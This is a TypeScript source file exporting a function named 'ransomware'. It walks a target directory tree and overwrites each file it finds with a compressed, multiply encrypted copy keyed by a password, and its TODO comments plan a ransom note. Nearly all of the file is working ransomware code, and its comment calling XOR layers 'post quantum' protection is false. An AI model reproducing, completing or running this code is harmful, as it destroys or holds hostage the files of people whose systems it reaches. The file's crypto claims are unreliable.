import zlib from "zlib";
import fs from "fs";
import crypto from "crypto";
import path from "path";
import { fdir } from "fdir";

/*
const removeElementsInWhiteList = (listOfFiles: string[]) => {
  const whitelist = [
    "ld-musl-aarch64.so.1",
    "libc.musl-aarch64.so.1",
  ];

// This code takes to long 
 *
 * const newList = [];

  let addFile = true;
  for (let i = 0; i < listOfFiles.length; ++i) {
    addFile = true;
    for (let j = 0; j < whitelist.length; ++j) {
      let filename = "";
      if (/\//g.test(listOfFiles[i])) {
        const aux = listOfFiles[i].split("/");
        filename = aux[aux.length-1];
      } else {
        filename = listOfFiles[i];
      }

      if (filename === whitelist[j]) {
        addFile = false;
      }

    }
    if (addFile) {
      newList.push(listOfFiles[i]);
    } else {
      addFile = true;
    }
  }
  return newList;
  //
  return listOfFiles;
}
*/

/*
let counter = 0;
let time = new Date();
const readdir = (directory: string) => {
  ++counter;
  if (counter % 10) {
    console.log(`${counter} directories read in ${+new Date() - +time} ms`);
  }
  let fileList: string[] = [];

  let files: string[] = [];
  try { 
    files = fs.readdirSync(directory);
  } catch(err) {
        
  }
 
  for (const file of files) {
    const p = path.join(directory, file);
    try {
      if (fs.statSync(p)?.isDirectory()) {
        fileList = [...fileList, ...(readdir(p))];
      } else {
        fileList.push(p);
      }
    } catch(err) {
      return fileList;
    } 
  }

  return fileList;
}
*/

const readdir = (directory: string): string[] => {
  let dirCounter = 0;
  const api = new fdir().exclude( (filename, path) => {
  console.log(`Searching in dir ${path} (${dirCounter++})`);
  let startPath = path;
  try {
    startPath = path.split("/")[1];
  } catch(err) {
    // silent error
  }

    switch(filename) {
      case "node":
	return true;
    }

    switch(startPath) {
      case "bin":
      case "lib":
      case "proc":
      case "dev":
	return true;
    }

    return false;
  }).withFullPaths().crawl(directory);

  const files = api.sync();
  return files as string[];
}

// Load a file as utf-8 encoding
const loadFile = (filename: string) => {
  return fs.readFileSync(filename);
}

const saveToFile = (filename: string, data: any) => {
  return fs.writeFileSync(filename, data);
}

const compressBuffer = (data: Buffer, speed: number) => {
  return zlib.brotliCompressSync(data, {
    params: {
      [zlib.constants.BROTLI_PARAM_QUALITY]: speed
    }
  });
}

const uncompressBuffer = (data: Buffer) => {
  return zlib.brotliDecompressSync(data);
}

const encrypt = (data: Buffer, password: string) => {
  let originalPassword = password;

  /* Extra layer of xor encryption to resist post quantum crypto */
  let xorPassword = password;
  let xorPasswordBuffer = Buffer.alloc(data.length);
  
  do {
    xorPassword = Buffer.from(xorPassword).toString("base64");
  } while (xorPassword.length <= data.length);
  Buffer.from(xorPassword).copy(xorPasswordBuffer);

  for (let i = 0; i < data.length; ++i) {
    data[i] = data[i] ^ xorPasswordBuffer[i];
  }
  /* End of first post quantum protection layer */

  // TODO: Add columnar transposition here


  do {
    password = Buffer.from(password).toString("base64");
  } while (password.length <= 32);
  password = password.substring(0, 32);

  // TODO: Change passwords for derivations
  
  

  const iv = crypto.randomBytes(16);
  const cipher = crypto.createCipheriv("aes-256-cbc", password, iv);
  const result = Buffer.concat([iv, cipher.update(data), cipher.final()]);

  const iv2 = crypto.randomBytes(16);
  const cipher2 = crypto.createCipheriv("camellia-256-cbc", password, iv2);
  const result2 = Buffer.concat([iv2, cipher2.update(result), cipher2.final()]);

  const iv3 = crypto.randomBytes(16);
  const cipher3 = crypto.createCipheriv("aes-256-cbc", password, iv3);
  const result3 = Buffer.concat([iv3, cipher3.update(result2), cipher3.final()]);

  // TODO: Add Another layer of post quantum protection here
  // take a byte, reorder it and derivate key? 
  // think about using hashes instead of password
  
  let hash = crypto.createHash("sha512").update(originalPassword, "binary").digest("base64");
  let hashBuffer = Buffer.alloc(result3.length);
  do {
    hash = Buffer.from(hash).toString("base64");
  } while (hash.length <= result3.length);
  hashBuffer = Buffer.from(hash.substring(0, result3.length));
  
  for (let i = 0; i < result3.length; ++i) {
    result3[i] = result3[i] ^ hashBuffer[i];
  }
   
  return result3;
}

const decrypt = (data: Buffer, password: string) => {
  let hash = crypto.createHash("sha512").update(password, "binary").digest("base64");
  let hashBuffer = Buffer.alloc(data.length);
  do {
    hash = Buffer.from(hash).toString("base64");
  } while (hash.length <= data.length);
  hashBuffer = Buffer.from(hash.substring(0, data.length));

  for (let i = 0; i < data.length; ++i) {
    data[i] = data[i] ^ hashBuffer[i];
  }



  let xorPassword = password;

  do {
    password = Buffer.from(password).toString("base64");
  } while (password.length <= 32);
  password = password.substring(0, 32);

  const iv = data.slice(0, 16);
  const encrypted = data.slice(16);
  const decipher = crypto.createDecipheriv("aes-256-cbc", password, iv);
  const result = Buffer.concat([decipher.update(encrypted), decipher.final()]);

  const iv2 = result.slice(0, 16);
  const encrypted2 = result.slice(16);
  const decipher2 = crypto.createDecipheriv("camellia-256-cbc", password, iv2);
  const result2 = Buffer.concat([decipher2.update(encrypted2), decipher2.final()]);

  const iv3 = result2.slice(0, 16);
  const encrypted3 = result2.slice(16);
  const decipher3 = crypto.createDecipheriv("aes-256-cbc", password, iv3);
  const result3 = Buffer.concat([decipher3.update(encrypted3), decipher3.final()]);

  /* Extra layer of xor dcryption to resist post quantum crypto */
  let xorPasswordBuffer = Buffer.alloc(result3.length);

  do {
    xorPassword = Buffer.from(xorPassword).toString("base64");
  } while (xorPassword.length <= result3.length);
  Buffer.from(xorPassword).copy(xorPasswordBuffer);
  for (let i = 0; i < result3.length; ++i) {
    result3[i] = result3[i] ^ xorPasswordBuffer[i];
  }
  /* End of first post quantum protection layer */

  return result3;
}


/* TODO: 
 * Chose Ransomware Speed
 * Chose Folder
 * Chose Strength of cipher
 * Add Note to /path after encryption ends
*/
const ransomware = (options: string) => {
  options = options.substring(12, options.length);
  const [mode, key, path, speed] = options.split(" ");

console.log("Readding directories for files...");
let oldTime = new Date();
  const filesInPath = readdir(path);
console.log(`Files found in ${+new Date() - +oldTime} ms`);

  console.log("Procesing " + filesInPath.length + " files...");
  for(let i = 0; i < filesInPath.length; ++i) {
    console.log(`${i} of ${filesInPath.length} as ${filesInPath[i]} ...`); 
    try {
      const fileData = loadFile(filesInPath[i]);
      if (mode === "e" || mode === "encrypt") {

console.log("Compressing file with level " + speed);
oldTime = new Date();
        const compressedFileDataBuffer = compressBuffer(fileData, +speed);
console.log(`${fileData.length} bytes compressed in ${+new Date() - +oldTime} ms`);

console.log("Encrypting file...");
oldTime = new Date();
        const encryptedDataBuffer = encrypt(compressedFileDataBuffer, key);
console.log(`File encrypted in ${+new Date() - +oldTime} ms`);

console.log("Writing file to disk...");
oldTime = new Date();
        saveToFile(filesInPath[i], encryptedDataBuffer);
console.log(`File writed in ${+new Date() - +oldTime} ms`);

      } else {
        const decryptedDataBuffer = decrypt(fileData, key);
        const decompressedFileDataBuffer = uncompressBuffer(decryptedDataBuffer);
        saveToFile(filesInPath[i], decompressedFileDataBuffer);
      }
    } catch(err) {
      console.log("Error loading file: " + err);
      // silent error
    } 

  }
  return path + " files " + ((mode === "e" || mode === "encrypt") ? "encrypted" : "decrypted");
}

export default ransomware;
